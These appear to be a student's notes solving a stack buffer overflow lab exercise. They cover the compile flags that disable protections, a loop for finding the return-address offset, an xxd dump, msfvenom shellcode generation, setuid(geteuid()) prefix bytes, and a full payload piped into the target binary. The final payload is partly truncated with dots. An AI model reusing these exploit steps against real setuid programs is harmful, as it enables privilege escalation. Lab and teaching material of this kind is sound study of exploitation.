Hint to compile the file.
gcc -fno-stack-protector -z execstack -no-pie -ggdb -O0 -o ex5-stack-overflow-3 ex5-stack-overflow-3.c

=============================
Solution:
 [ attcker code ][ buf============ bytes to fill================== ] + [ return address (8bytes 64bit) (4bytes 32bit) of the buf( targted variable )]

 1. attacker code : usually shelcode
 2. buf : fill the buf consideing the shelcode size
 3. return address (check the address based arch ( size))
	a. 8 bytes for the 64bit system
	b. 4 bytes for the 32bit system

phase01:

example of running an " infinite loop ":

for I in `seq 250 300` ; do echo "I IS NOW $I"; (echo -ne '\xeb\xfe' ; dd if=/dev/zero count=1 bs=$I ; echo -ne '\x90\xe2\xff\xff\xff\x7f\x00\x00') > output.bin ; ./ex5-stack-overflow-3 < output.bin ; done;

in my case the value of I was 278 so:  278 + 2bytes of infite loop + return address => here where we can run our attacking code

(echo -ne '\xeb\xfe' ; dd if=/dev/zero count=1 bs=278 ; echo -ne '\x90\xe2\xff\xff\xff\x7f\x00\x00') > output.bin ; ./ex5-stack-overflow-3 < output.bin ;

phase02:

xxd command : xxd - make a hexdump or do the reverse

example : 
xxd output.bin

output : 

00000000: ebfe 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000110: 0000 0000 0000 0000 90e2 ffff ff7f 0000  ................


Create Shellcode using:
	- msfvenom
	- generate a payload with -p linux/x64/exec as the payload, 
	- encode it with --encode x64/xor_dynamic which makes it understandable by x64 intel processors, 
	- set the CMD to something like CMD="/home/xsaleh/customscript.sh"
	- set the payload with -f c to format it as a C array of bytes
	- add skipping security bytes at the beginning of the shellcode, which overcome the security measures 
	  " \x6a\x6b\x58\x0f\x05\x48\x89\xc7\x48\x89\xc6\x48\x89\xc2\x6a\x75\x58\x0f\x05 "  
	   these bytes are instructions for doing setuid(geteuid()) which means, that the sticky bit is kept and 
	   the shell command will be executed as user flag01 on the flag folder

	run the final code + buf + return address | ./targeted-app

msfvenom -p linux/x64/exec --encode x64/xor_dynamic CMD="/home/xsaleh/customscript.sh" -f c

echo -ne '\x6a\x6b\x58\x0f\x05\x48\x89\xc7\x48\x89\xc6\x48\x89\xc2\x6a\x75\x58\x0f\x05\xeb\x27\x5b\x53\x5f
\xb0\x4b\xfc\xae\x75\xfd\x57\x59\x53\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x67\x10\x74
\x07\x80\x3e\x4b\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff\xff\x01\x4b\x6b\x3a\x59\x98
\x49\xba\x2e\x63\x68\x6f\x2e\x72\x69\x01\x52\x49\x88\xe6\x69\x2c\x62\x01\x01\x49\x8
8\xe7\x53\xe9\x1c\x01\x01\x01\x2e\x69\x6e\x6c\x64\x2e\x79\x72\x60\x6d\x64\x69\x2
e\x62\x74\x72\x75\x6e\x6c\x72\x62\x73\x68\x71\x75\x2f\x72\x69\x01\x57\x56\x49\x8
8\xe7\x0e\x04\x67\x10............................................................
.........................................................................
..........\x90\xe2\xff\xff\xff\x7f\x00\x00' | ./ex5-stack-overflow-3

[remove messures hexa code size] + [shelld code] + [random data 278+2-118-19 size]


